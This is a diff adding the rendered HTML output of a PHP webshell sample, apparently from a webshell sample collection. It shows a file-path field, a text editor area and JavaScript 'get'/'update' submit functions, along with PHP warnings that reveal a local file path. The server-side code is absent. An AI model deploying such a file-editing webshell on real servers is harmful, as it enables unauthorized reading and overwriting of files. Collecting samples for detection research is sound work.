@@ -1,0 +1,15 @@
+<form action="" method="post" id="fm">
+Warning: Cannot modify header information - headers already sent by (output started at C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\test.php:2) in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\test.php on line 4
+File:<input type="text" style="width:600px;" name="file" value="" /><input type="button" style="margin-left:20px;" value="update" onclick="update()" /><span id="result"></span><br/>
+Warning: file_get_contents(): Filename cannot be empty in C:\Users\yaoleo\Desktop\webshellSample-master\webshellSample-master\PHP\dama\test.php on line 13
+<textarea style="width:800px;height:600px;" name="data"></textarea><input type="hidden" name="p" id="p" value=""/><input type="hidden" name="action" id="action" value="get" /></form><script>
+function get(p){
+     document.getElementById('p').value = p;
+     document.getElementById('action').value = "get";
+     document.getElementById('fm').submit();
+}
+function update(){
+     document.getElementById('action').value = "update";
+     document.getElementById('fm').submit();
+}
+</script>
